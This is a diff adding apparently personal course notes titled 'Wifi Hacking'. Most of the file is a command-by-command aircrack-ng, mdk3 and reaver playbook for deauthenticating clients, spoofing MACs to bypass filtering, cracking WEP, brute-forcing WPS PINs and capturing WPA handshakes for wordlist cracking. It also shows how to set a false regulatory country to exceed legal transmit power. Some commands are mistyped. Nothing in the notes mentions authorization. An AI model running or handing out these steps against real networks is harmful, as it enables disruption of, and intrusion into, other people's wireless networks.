@@ -1,0 +1,513 @@
+Wifi Hacking
+
+
+Mac Changer 1st way
+
+ifconfig wlan1 down
+macchanger --random wlan1
+ifconfig wlan1 up
+iwconfig wlan1
+ifconfig wlan1
+
+_______________________________________________
+Mac Changer 2nd way
+
+ifconfig wlan1 down
+ifconfig wlan1 hw ether 00:11:22:33:44:55
+ifconfig wlan1 up
+
+________________________________________________
+
+Putting wifi adapter in monitor mode 
+1st way
+
+ifconfig wlan1mon down
+iwconfig wlan1mon mode monitor
+ifconfig wlan1mon up
+iwconfig wlan1mon
+
+
+_________________________________________________
+
+Putting wifi adapter in monitor mode 
+2nd way
+
+ifconfig wlan1mon down
+airmon-ng check kill
+airmon-ng start wlan1mon
+
+_________________________________________________________
+
+How to enter Monitor mode.. 
+3rd way
+
+airmon-ng
+airmon-ng start (name of your wifi adapter (wlan1)) 
+iwconfig wlan1mon
+
+use the name that airmon-ng tells you
+
+airmon-ng stop wlan1mon
+
+_________________________________________________________________
+
+Open WireShark
+
+Beacon Frames
+
+Creating a fake access point
+
+mdk3 --help
+
+mdk3 wlan1 b -n testap1
+
+
+_____________________________________
+
+Spoofing 802.11 frames is very easy
+no security mechanism
+Beacon Frames are in plane text No Encryption.
+
+Open WireShark
+__________________________________________________
+
+Packet Sniffing Basics
+
+Wifi card should be in monitor mode
+airodump-ng wlan1
+airodump-ng is used for packey=t capturing of RAW 802.11 frames
+
+https://www.aircrack-ng.org/doku.php?id=airodump-ng
+
+airodump-ng wlan1
+
+____________________________________________
+
+see and scans the networks the wifi adapter is in range
+
+airodump-ng wlan1
+
+now we have our network we want to target
+
+
+ 
+airodump-ng --channel 11 --bssid 00:11:22:33:44:55 --write test-y1 wlan1
+
+_____________________________________________________________
+
+
+Packet Sniffing on 5GHz network
+You need a wifi adapter that supports 5GHz
+
+
+airodump-ng by default only sniff 2.4GHz frequency
+
+Targeting Networks operating on 5GHz frequency
+
+b g n operates on 2.4GHz
+a operates on 5GHz
+ac operates on 5GHz
+
+airodump-ng wlan1
+
+
+______________________________________________________________________________
+
+DeAuthentication Attack
+
+This attack can disconnect any device from any access point within our vicinity.
+
+Attacker sends de-auth packets
+
+aireplay-ng --deauth1000 -a {AP MAC Address} wlan1
+
+--------------------------
+
+Deauthentication Attacks
+
+use this to disconnect the target machine.
+we want to disconnect to target machine and than we want to disconnect the target network.
+once we disconnect the target access point we will spoof the access point for the target to connect to us.
+
+aireplay-ng
+
+aireplay-ng --deauth 10000 -a 00:11:22:33:44:55 wlan1
+
+58:E2:8F:47:41:8C
+
+aireplay-ng --deauth 1000 -a 33:22:02:33:33:33 -c 44:44:44:88:44:44 wlan1
+
+airodump-ng name of our (adapter)
+
+aireplay-ng --deauth 1000 -a 33:22:02:33:33:33 -c 44:44:44:88:44:44 wlan1
+
+aireplay-ng --deauth 1000 -a
+
+aireplay-ng --deauth 10000 -a 00:11:22:33:44:55 -c 11"22"33"44"55:11  wlan1
+
+_________________________________________________________________
+
+Discovering hidden SSIDs
+
+ESSID is not broadcasting in beacon frames
+
+Start sniffing hidden network
+
+Passive Method
+
+Wait for any client to connect
+
+Active Method
+
+Deauthenticate clients when they reconnect you can see their name
+
+aireplay-ng --deauth 10000 -a 00:11:22:33:44:55 wlan1
+
+-------------------
+
+Deauthenticate clients
+
+Discover hidden networks
+
+# what networks are hidden <length: 0>
+
+airodump-ng --bssid 33:22:02:33:33:33 --channel 6 wlan1
+
+# disconnect the target and when they are connecting the name will show
+in the 2nd terminal running   airodump-ng --bssid 00:11:22:33:44:55 --channel 6 wlan1 
+ 
+aireplay-ng --deauth 1000 -a 33:22:02:33:33:33 -c 44:44:44:88:44:44 wlan1
+Text editor Geany
+
+
+
+_____________________________________________________________
+
+MAC Address Verification
+
+Create MAC table in router
+There are two methods for MAC address verification
+
+Blacklist MAC Address
+
+All MAC address are allowed except those which are in MAC table.
+
+Whitelist MAC address
+
+All MAC address are blocked except those which are in MAC table.
+
+
+
+airmon-ng start wlan1
+
+
+This will show the targets clients computer..
+
+airodump-ng --bssid 00:11:22:33:44:55 --channel 1 wlan1
+
+Now bring your card down
+
+ifconfig wlan1 down 
+
+now go to the mac changer
+macchanger -m {nameof mac address} wlan1
+ifconfig wlan1 up
+
+bypassing MAC filtering
+run airodump-ng
+airodump-ng --bssid 33:22:02:33:33:33 --channel 6 wlan1
+after running get the target bssid
+
+now spoof your mac address to the client mac address 
+use the mac changer
+
+ifconfig wlan1 down
+macchanger -m 80:80:80:80:80:80
+ifconfig wlan1 up
+_____________________
+
+leafpad /etc/NetworkManager/NetworkManager.conf
+
+---------------------------------------------------------
+[main]
+plugins=ifupdown,keyfile
+
+[ifupdown]
+managed=false
+
+[device]
+wifi.scan-rand-mac-address=no
+
+____________________________
+
+
+Transmit Power
+
+1 dBm
+2 dBm
+3 dBm
+4 dBm
+5 dBm
+
+
+iwconfig wlan1 txpower 30
+
+kernel.googlesource.com
+
+have to change your registery settings to the country that allows 30 dBm
+
+ifconfig wlan1 down
+
+iw reg set GY
+
+iwconfig wlan1 txpower 30
+
+ifconfig wlan1 up
+
+iwconfig wlan1
+
+iw reg get
+
+--------------------------------
+
+DMB and DBI
+
+Transmit power of wifi adapter is measured in dBm
+
+Transmit power of antenna is measured in dBi
+
+__________________________________________________________
+
+WEP Wired Equivalent Privacy
+
+First wirless Encryption Protocol
+
+Uses RC4 Algorith(Symmetric Key Encryption)
+
+24 iv 40 or 104 WEP Key = RC4 Algorithm  64 bit or 128 bit key  Random Key Stream
+
+WEP Generating Integrity Check Value
+Data = CRC 32  -- ICV 32 Bit  Data ICV 32 Bit
+
+WEP Cipher Text Generation
+IV to Cipher Text  Key Stream  xor  Cipher text    Plain Text
+
+
+------------------------------------
+
+WEP Attack Basics
+
+Sniff packets from target access point
+CollectIV's
+Some IV's and large number of packets will help you crack WEP
+
+airodump-ng --channel 1 --bssid 00:11:22:33:44:55 --write test_wep wlan1
+
+airodump-ng --bssid 00:11:22:33:44:55 --channel 11 --write test wlan1
+
+
+aircrack-ng test_wep-01.cap
+
+
+------------------------------
+
+WEP Attack No Clients
+
+Before we can Ininject packets:
+Injecting Packets into traffic we have to Authenicate our wifi card with the AP..
+
+
+Fake Authenicate.
+
+aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h AA:11:BB:00:CC:22 wlan1 
+
+Than 
+
+aireplay-ng --arpreplay 0 -b 00:11:22:33:44:55 -h AA:11:BB:00:CC:22 wlan1 
+                          (bssid)
+
+aircrack-ng (filename from airodump-ng --bssid 00:11:22:33:44:55 --channel 11 --write test wlan1
+)   
+
+aircrack-ng (filename) 
+
+---------------------------------------------
+
+Inject Packets
+Fake Authenthication
+aireplay-ng --fakeauth | -a {AP MAC} -h {MAC} wlan1
+
+airodump-ng wlan1
+airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write test1 wlan1
+
+open another terminal
+
+aireplay-ng --fakeauth 1 -a 00:11:22:33:44:55 -h 00:88:77:66:55:55 wlan1
+
+
+----------------------------------------------------------------
+
+
+aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h 00:88:77:66:55:55 wlan1
+
+aircrack-ng test1-01.cap
+
+__________________________________________________________________________________
+
+WPS Wi-fi protected setup
+
+Wireless Network security protocol to make connections between router and wireless devices
+
+works with WPA/WPA2 Personal Protocol
+
+We can use it instead of password
+
+consist of 8 Digit Code
+
+-------------------
+
+Why WPS?
+
+Push Button Solution
+
+Simplify the connection process
+
+------------------------------------
+
+WPS Attack protocol
+
+What network has WPS enabled 
+
+wash command will only show which networks that have WPS enabled
+wash -i wlan1
+
+airodump-ng does not show the WPS
+
+
+-------------------
+
+we will use reaver
+
+reaver -b 00:11:22:33:44:55 -c 11 -i wlan1
+
+now we have to unlock the WPS
+
+we will use the command mdk3 to unlock
+
+mdk3 --help a
+
+mdk3 wlan1 a -a 00:11:22:33:44:55
+
+now after we unlocked the WPS now we can start the session where we left off at.
+
+we will use the same command reaver
+
+reaver -b 00:11:22:33:44:55 -c 11 -i wlan1
+
+if what does not work we can try a random 
+
+mdk3 wlan1 x 0 -t 00:11:22:33:44:55 -n ESSID riza -s 1000
+
+--------------------------------------------------------------------
+
+you can download the script
+
+
+---------------------------------------------
+Hackers View
+
+WPA / WPA2 
+
+Personal
+Enterprise
+
+Dynamic Key Generation
+
+How Dynamic Key Works?
+
+Pre Shared Key
+
+Password Based Key Derivation Function
+
+Password
+SSID
+SSID Length
+
+PBKDF2     PSK(256)
+
+Password, SSID, SSID Length, 4096, 256
+
+ANounce Becaon
+
+---------------------
+
+ANounce & Source Packets
+
+Pairwise Transient Key (PTK)
+
+PSK
+ANounce
+Sounce
+AP-MAC
+Client-MAC
+
+ANounce & SNounce are random packets
+
+
+ANounce
+
+SNounce
+MIC
+
+Key Installtion
+
+Key Acknowledgement
+
+---------------------------------------------
+
+Pre Shared Key (256 bit)
+PBKDF2
+Password
+
+4-Way Handshake
+
+Anounce
+Snounce
+AP-MAC
+Client-MAC
+
+       PTK
+MIC== {MIC}
+
+PreShared Key (256)
+PBKDF2
+Dictionary
+
+_____________________________________________________
+
+WPA / WPA2 Cracking
+
+airodump-ng wlan1
+
+
+______________________________________________________________
+
+WPA / WPA2 - Word-List Attack
+
+airodump-ng wlan1
+
+airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --showack --write test-ap-hand wlan1
+
+This will get us the 4 way hand-shake
+aireplay-ng -0 20 -a 00:11:22:33:44:55 -c 11:22:33:44:55:11 wlan1
+
+ now we have the hand-shake
+
+----------------------
+
+Now we will create a word list
+
+aircrack-ng -w passwordlist.txt test1-ap-hand-01.cap
+
+
+__________________________________________________
